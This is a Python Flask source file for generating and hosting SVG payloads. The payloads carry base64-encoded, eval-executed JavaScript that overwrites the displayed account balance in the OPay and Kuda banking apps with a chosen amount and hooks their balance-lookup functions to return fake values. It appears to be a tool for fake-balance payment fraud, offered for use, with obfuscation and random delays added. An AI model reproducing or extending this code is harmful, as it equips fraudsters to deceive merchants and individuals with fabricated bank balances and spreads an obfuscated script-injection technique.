from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import uuid
import os
import random
import base64

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

def generate_robust_payload(device_id, target_app, target_amount):
    # App-specific payloads
    opay_payload = f"""
    // OPay specific hooks
    try {{
        // Override OPay's balance element
        const opayElements = document.querySelectorAll('[data-testid="opay-balance"]');
        if (opayElements.length > 0) {{
            opayElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into OPay's native methods
        if (window.OPayAPI) {{
            window.OPayAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    kuda_payload = f"""
    // Kuda specific hooks
    try {{
        // Override Kuda's balance element
        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
        if (kudaElements.length > 0) {{
            kudaElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into Kuda's native methods
        if (window.KudaAPI) {{
            window.KudaAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    # Combined payload
    js_payload = f"""
    // Target app selection
    const targetApp = '{target_app}';
    const targetAmount = '{target_amount}';
    
    // Execute app-specific hooks
    if (targetApp === 'OPay') {{
        {opay_payload}
    }} else if (targetApp === 'Kuda') {{
        {kuda_payload}
    }}
    
    // Common fallbacks
    try {{
        // Simple DOM manipulation
        const elements = document.querySelectorAll('[data-testid="balance"]');
        if (elements.length > 0) {{
            elements[0].textContent = targetAmount;
        }}
        
        // Deep link fallback
        setTimeout(function() {{
            try {{
                window.location = 'kuda://balance';
                window.location = 'opay://dashboard?section=balance';
            }} catch (e) {{
                // Last resort
                localStorage.setItem('targetBalance', targetAmount);
            }}
        }}, 500);
    }} catch (e) {{
        console.log("Error:", e);
    }}
    """
    
    # Encode payload to avoid syntax errors
    encoded_payload = base64.b64encode(js_payload.encode()).decode()
    svg_payload = f"""
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            // Execute payload using eval
            (function() {{
                try {{
                    eval(atob('{encoded_payload}'));
                }} catch (e) {{
                    console.log("Eval error:", e);
                }}
            }})();
        </script>
    </svg>
    """
    
    return svg_payload

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_robust_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 1000)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
